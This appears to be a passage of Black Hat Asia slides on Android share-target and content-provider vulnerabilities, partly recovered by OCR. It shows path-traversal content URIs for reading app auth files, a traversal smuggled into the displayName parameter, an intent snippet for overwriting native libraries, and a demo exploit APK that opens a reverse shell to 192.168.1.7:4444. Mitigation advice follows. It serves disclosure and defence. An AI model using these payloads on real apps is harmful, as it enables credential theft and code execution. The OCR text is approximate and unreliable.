example.xml.bak ~~example.xml~~ example.xml.bak -> example.xml

#BHASIA @BlackHatEvents

## Slide 34

## <u>READING FILES</u>

#BHASIA @BlackHatEvents

## Slide 35

###### <u>Exploiting Read Access</u>

`o` Misconfigured content provider

`o` “Loose” file provider paths

`o` Caches the stream to a shared directory

#BHASIA @BlackHatEvents

## Slide 36

###### <u>Misconfigured Content Provider</u>

The application shares files using a content provider instead of a file provider. **content://com.vulnerable.app/file_path/../../../shared_prefs/user_auth.xml**

#BHASIA @BlackHatEvents

## Slide 37

###### “Loose” file provider paths

**content://com.vulnerable.app/root/**

**data/data/com.vulnerable.app/shared_prefs/user_auth.xml**

#BHASIA @BlackHatEvents

## Slide 38

###### <u>Caching to a shared dir</u>

file:///sdcard/path/to/cache/file

Or not sanitizing the displayName query parameter **content://com.vulnerable.app/data/data/com.vulnerable.app/shared_prefs/user_auth.xml ?displayName=../../../../../attacker/readable/directory**

#BHASIA @BlackHatEvents

## Slide 39

###### <u>Impact</u>

**20 Android Apps Sample having > 100M installs**

#BHASIA @BlackHatEvents

## Slide 40

#### <u>Code Execution Show Case</u>

#BHASIA @BlackHatEvents

## Slide 41

###### <u>Code Execution Show Case</u>

#BHASIA @BlackHatEvents

> Text below was recovered by OCR (confidence 81/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
blackhat Code Execution Show Case |
GE Browser - Fast & Safe
<activity-alias android: label="@string/reader_thdcall_filereader_office" droid: icon=
true android:excludeFr} pRecents="true" android: LlaunchMode="singleTask" android:screenOrientation="user"
<intent-filter>
<action android:name="android. intent.action.SEND"/>
<data android:mimeType="application/msword"/>
<data android:mimeType="application/vnd.openxmlformats—of ficedocument.wordprocessingml.document"/>
<data android:mimeType="application/rtf"/>
<data android:mimeType="text/rtf"/>
</intent-filter>
#BHASIA @BlackHatEvents
```

## Slide 42

###### <u>Code Execution Show Case</u>

**md5** (uri)

**/storage/emulated/0/Android/data/deducted/cache/.deducted/ Filename returned from the file provider**

#BHASIA @BlackHatEvents

## Slide 43

###### <u>Code Execution Show Case</u>

#BHASIA @BlackHatEvents

> Text below was recovered by OCR (confidence 79/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
blackhat Code Execution Show Case |
[ p>] Entering:
ctivity clip={text/rtf {UCcontent)}} Chas extras) }
[ ««<« ] Exiting com.- tentCal LExtension.r
\_Returns: undefined
[ «4 ] Exiting com.- tentCal LExtension.h
\_Returns: undefined
IFile $init called! >: /data/user/0/ prefs/com.google.android.gms .measure
ment prefs xml
IFile $init called| >: /storage/emulated/@/Android/data/com. XeaderTemp/thra
barbet : /storage/emuLated/@/Android/data/com. ; /cache # 1s -al
“totat 15
drwxrws--- 3 10645 1078 3452 Feb 1 16:50.
drwxrws--- 4 10645 1078 3452 Feb 1 14:26 ..
drwxrws--- 4 10645 1078 3452 Feb 1 15:31 .ReaderTemp
-rw-rw---- 1 10645 1078 31 Feb 1 16:39 AAAAAAAAAAAA
#BHASIA @BlackHatEvents
```

## Slide 44

###### <u>Code Execution Show Case</u>

Can we replace the native libraries ?

#BHASIA @BlackHatEvents

> Text below was recovered by OCR (confidence 88/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
A
blackhat Code Execution Show Case |
Can we replace the native libraries ?
Intent intent = new Intent( action: android.intent.action.SEND).setClassName( packageName ‘con a
intent.putExtra( name: android.intent.extra.STREAM, Uri.parse("content://com.exploit/a.zip?path=/data/data/com
#BHASIA @BlackHatEvents
```

## Slide 45

###### <u>Code Execution Show Case</u>

Can we replace the native libraries ? What about ?

**/data/data/deducted/files/splitcompat/** [v]/ **native-libraries/** [lib – config][arch].apk/ **lib[name].so**

**~~That wouldn't always work~~**

#BHASIA @BlackHatEvents

## Slide 46

###### <u>Code Execution Show Case</u>

Can we replace the native libraries ? What about ?

**/data/data/deducted/files/splitcompat/** [v]/ **verified-splits/native.apk**

#BHASIA @BlackHatEvents

## Slide 47

###### <u>Code Execution Show Case</u>

#BHASIA @BlackHatEvents

> Text below was recovered by OCR (confidence 86/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
blackhat Code Execution Show Case
Pixel 5 eoee x4 ne 192.168.1.7 4444
\» adb install PhoenixExploit.apk
Performing Streamed Install
Success
i» Ls» ne 192.168.1.7 4444
/system/bin/sh: can't find tty fd: No such device or address
/system/bin/sh: warning: won't have full job control
Unable to open this file
G Howt
ar file?
#BHASIA @BlackHatEvents
```

## Slide 48

###### <u>Beyond Share Targets</u>

Any interaction with another app that might involve an external content provider must be handled as untrusted

#BHASIA @BlackHatEvents

## Slide 49

###### <u>Securing Share Targets</u>

`o` Ensure that the incoming stream matches the filter criteria `o` If possible, ignore the _display_name

`o` If not, take extra steps to sanitize it

- Canonicalize the file name

   - Isolate the filename

      - Filter out special characters

#BHASIA @BlackHatEvents

## Slide 50

###### <u>Blackhat Sound Bytes</u>

`o` Consider all data originating outside your app’s private sphere as untrusted.

Validate the data type, ignore the filename whenever is possible.

`o` Do not load executables from the data directory Avoid loading libraries, dex files etc. Replace them with clean copies whenever is possible.

`o` Never install applications from untrusted sources

PlayStore performs regular checks to ensure that applications meet certain criteria.

#BHASIA @BlackHatEvents

## Slide 51

@ch0pin ch0pin@infosec.echange

References: <u>News, Techniques & Guides | Oversecured Blog</u>

<u>Improperly Exposed Directories to FileProvider | Android Developers</u>

#BHASIA @BlackHatEvents
